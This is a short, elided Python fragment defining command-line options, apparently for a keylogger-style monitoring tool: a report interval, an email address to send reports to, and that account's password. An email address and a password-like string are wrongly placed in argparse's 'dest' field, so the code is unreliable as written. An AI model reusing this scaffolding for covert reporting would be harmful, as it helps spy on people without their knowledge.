...
def get_arguments():
    ...
    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds.", default=20)
    ...
    required_arguments.add_argument("-e", "--email", dest="trackthisguy@outlook.com", help="Email address to send reports to.")
    required_arguments.add_argument("-p", "--password", dest="TrackThis", help="Password for the email address given in the -e argument.")
